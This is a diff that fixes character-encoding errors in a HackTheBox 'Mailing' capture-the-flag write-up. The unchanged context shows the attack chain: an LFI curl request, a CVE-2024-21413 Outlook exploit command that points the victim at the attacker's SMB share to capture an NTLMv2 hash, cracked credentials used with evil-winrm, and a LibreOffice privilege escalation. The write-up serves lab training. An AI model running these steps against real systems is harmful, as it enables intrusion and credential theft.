@@ -96,16 +96,16 @@ nmap -p25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49
 
 | Port   | Service        | Version / Info                                                                 |
 |--------|----------------|--------------------------------------------------------------------------------|
-| 25     | SMTP           | hMailServer smtpd â€” AUTH LOGIN PLAIN, HELP                                      |
-| 80     | HTTP           | Microsoft IIS httpd 10.0 â€” Title: Did not follow redirect to http://mailing.htb |
+| 25     | SMTP           | hMailServer smtpd — AUTH LOGIN PLAIN, HELP                                      |
+| 80     | HTTP           | Microsoft IIS httpd 10.0 — Title: Did not follow redirect to http://mailing.htb |
 | 110    | POP3           | hMailServer pop3d                                                              |
 | 135    | MSRPC          | Microsoft Windows RPC                                                          |
 | 139    | NetBIOS-SSN    | Microsoft Windows netbios-ssn                                                  |
-| 143    | IMAP           | hMailServer imapd â€” IMAP4rev1 OK CAPABILITY NAMESPACE                          |
-| 445    | SMB            | Microsoft Windows SMB â€” message signing enabled but not required               |
-| 465    | SMTPS          | hMailServer smtpd â€” STARTTLS, AUTH LOGIN PLAIN, HELP                           |
-| 587    | SMTP           | hMailServer smtpd â€” STARTTLS, AUTH LOGIN PLAIN, HELP                           |
-| 993    | IMAPS          | hMailServer imapd â€” IMAP4rev1 OK CAPABILITY NAMESPACE                          |
+| 143    | IMAP           | hMailServer imapd — IMAP4rev1 OK CAPABILITY NAMESPACE                          |
+| 445    | SMB            | Microsoft Windows SMB — message signing enabled but not required               |
+| 465    | SMTPS          | hMailServer smtpd — STARTTLS, AUTH LOGIN PLAIN, HELP                           |
+| 587    | SMTP           | hMailServer smtpd — STARTTLS, AUTH LOGIN PLAIN, HELP                           |
+| 993    | IMAPS          | hMailServer imapd — IMAP4rev1 OK CAPABILITY NAMESPACE                          |
 | 5040   | HTTP           | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                        |
 | 5985   | HTTP           | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                        |
 | 7680   | HTTP           | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                        |
@@ -179,7 +179,7 @@ Searching in Google we find where **hMailServer** stores its files by default:
 
 ![hmailserver_what_is](screenshots/hmailserver_what_is.png)
 
-Letâ€™s try some requests to see what we get:  
+Let’s try some requests to see what we get:  
 
 ```bash
 curl -s -X GET 'http://mailing.htb/download.php?file=C:\\Program Files\hMailServer\Data'
@@ -231,7 +231,7 @@ telnet 10.10.11.14 25
 ![telnet_passwd_base64](screenshots/telnet_passwd_base64.png)
 
 ---
-### 3.2 Exploitation â€“ Outlook RCE
+### 3.2 Exploitation – Outlook RCE
 
 Target vulnerable to **CVE-2024-21413**.  
 Exploit: [xaitax/CVE-2024-21413](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)
@@ -244,7 +244,7 @@ git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code
 
 ![git_clone_cve_2024_2](screenshots/git_clone_cve_2024_2.png)  
 
-Letâ€™s review the required parameters for this exploit to function correctly:
+Let’s review the required parameters for this exploit to function correctly:
 
 ```bash
 python3 CVE-2024-21413.py --s
@@ -257,7 +257,7 @@ Looking again the web, in the `instruction` files appears this screenshot:
 
 ![instructions_outlook_credentials](screenshots/instructions_outlook_credentials.png)
 
-The mail from image is `maya@mailing.htb`. LetÂ´s use it as Recipient and check if exists:
+The mail from image is `maya@mailing.htb`. Let's use it as Recipient and check if exists:
 
 ```bash
 python3 CVE-2024-21413.py --server 10.10.11.14 --port 587 --username administrator@mailing.htb --password 'homenetworkingadministrator' --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.2\smbFolder\test" --subject 'Look ASAP'
@@ -283,7 +283,7 @@ Since all captured hashes are identical, we can extract one and save it to a fil
 
 ![hash_maya_saved](screenshots/hash_maya_saved.png)
 
-Now letâ€™s crack the captured hash.  
+Now let’s crack the captured hash.  
 First, we identify its type using **hashid**:
 
 ```bash
@@ -326,7 +326,7 @@ evil-winrm -i 10.10.11.14 -u 'maya' -p 'm4y4ngs4ri'
 ![crackmapexec_maya](screenshots/crackmapexec_maya.png)
 ![user_flag](screenshots/user_flag.png)
 
-ðŸ **User flag obtained**
+🏁 **User flag obtained**
 
 ---
 ## 4. Privilege Escalation
@@ -376,19 +376,19 @@ We now have full control over the machine and can read the root flag:
 
 ![root_flag](screenshots/root_flag.png)
 
-ðŸ Root flag obtained
+🏁 Root flag obtained
 
 ---
-# âœ… MACHINE COMPLETE
+# ✅ MACHINE COMPLETE
 
 ---
 ## Summary of Exploitation Path
 
-1. **Web Enumeration** â†’ Found LFI via `download.php`.  
-2. **hMailServer.ini Disclosure** â†’ Extracted Administrator password.  
-3. **Outlook RCE (CVE-2024-21413)** â†’ Captured Mayaâ€™s NTLMv2 hash.  
-4. **Password Cracking** â†’ Accessed Mayaâ€™s account via WinRM.  
-5. **Privilege Escalation (CVE-2023-2255)** â†’ Malicious ODT file exploited by LibreOffice.  
+1. **Web Enumeration** → Found LFI via `download.php`.  
+2. **hMailServer.ini Disclosure** → Extracted Administrator password.  
+3. **Outlook RCE (CVE-2024-21413)** → Captured Maya’s NTLMv2 hash.  
+4. **Password Cracking** → Accessed Maya’s account via WinRM.  
+5. **Privilege Escalation (CVE-2023-2255)** → Malicious ODT file exploited by LibreOffice.  
 
 ---
 ## Defensive Recommendations
